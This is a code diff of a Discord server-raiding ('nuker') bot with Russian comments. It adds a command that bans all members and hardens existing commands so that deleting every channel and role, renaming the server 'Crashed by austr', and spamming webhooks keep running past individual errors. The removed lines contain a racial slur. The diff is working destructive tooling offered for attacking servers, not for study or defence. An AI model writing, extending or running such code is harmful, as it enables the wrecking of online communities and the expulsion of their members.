@@ -27,18 +27,20 @@ const embed = new MessageEmbed()
         .setImage('https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png')
 	.setColor('#ff0000');
 
+
+
 client.on('message', async (message) => {
   if (message.content === '~auto') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    try { 
      message.guild.channels.cache.forEach 
-     (channel => channel.delete());  
-     } catch { 
-        console.log("Негр ошибка");
-        } 
+     (channel => channel.delete().catch(e => {
+        console.log('error');
+      }));  
         message.guild.roles.cache.forEach(role => { 
-        if (role.editable && role.id !== message.guild.id) role.delete() 
+        if (role.editable && role.id !== message.guild.id) role.delete().catch(e => {
+        console.log('error');
+      }) 
     }); 
     await message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
     await message.guild.setName("××× Crashed by austr ×××");
@@ -95,19 +97,26 @@ client.on('message', async (message) => {
   if (message.content === '~delroles') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    try { 
       message.guild.roles.cache.forEach(role => { 
-        if (role.editable && role.id !== message.guild.id) role.delete() 
+        if (role.editable && role.id !== message.guild.id) role.delete().catch(e => {
+        console.log('error');
+      }) 
     }); 
-     } catch { 
-        console.log("Негр ошибка");
-        } 
                   } else {console.log('[ Будет спамить вам логи ]')}
               };
           });
 
 
-
+client.on('message', async (message) => {
+  if (message.content === '~banall') {
+  if (allowedusers.includes(message.author.id)) { //это сугуба моя хрень, она тут тупо для функционала
+    message.delete(); 
+      message.guild.members.fetch.forEach(member => member.ban().catch(e => {
+        console.log('error');
+      }))
+                  } else {console.log('[ Будет спамить вам логи ]')}
+              };
+          });
 
 client.on('message', async (message) => {
   if (message.content === '~rename') {
@@ -168,12 +177,10 @@ client.on('message', async (message) => {
   if (message.content === '~nuke') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    try {
      message.guild.channels.cache.forEach 
-     (channel => channel.delete()); 
-     } catch { 
-        console.log("Негр ошибка");
-        } 
+     (channel => channel.delete().catch(e => {
+        console.log('error');
+      })); 
         message.guild.roles.cache.forEach(role => { 
         if (role.editable && role.id !== message.guild.id) role.delete() 
     }); 
@@ -186,12 +193,10 @@ client.on('message', async (message) => {
   if (message.content === '~delchannels') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    try {
      message.guild.channels.cache.forEach 
-     (channel => channel.delete()); 
-     } catch { 
-        console.log("Негр ошибка");
-        } 
+     (channel => channel.delete().catch(e => {
+        console.log('error');
+      })); 
     } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
@@ -201,12 +206,10 @@ client.on('message', async (message) => {
   if (message.content === '~renchannels') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
-    try {
      message.guild.channels.cache.forEach 
-     (channel => channel.setName("crashed-by-austr-"+getRandomInt(1, 1000)));  
-     } catch { 
-        console.log(error)
-        } 
+     (channel => channel.setName("crashed-by-austr-"+getRandomInt(1, 1000)).catch(e => {
+        console.log('error');
+      }));  
     } else {console.log('[ Будет спамить вам логи ]')}
 };
 });
@@ -228,7 +231,7 @@ client.on('message', (msg) => {
   if (allowedusers.includes(msg.author.id)) {
     msg.delete();
     let now = Date.now()
-    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~delroles - удаление ролей\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера```')
+    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~delroles - удаление ролей\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера\n~banall - бан всех участников```')
   }
     } else {console.log('[ Будет спамить вам логи ]')}
 })
@@ -254,6 +257,7 @@ client.on('message', (msg) => {
   }
     } else {console.log('[ Будет спамить вам логи ]')}
 })
+
 
 
 keepAlive();
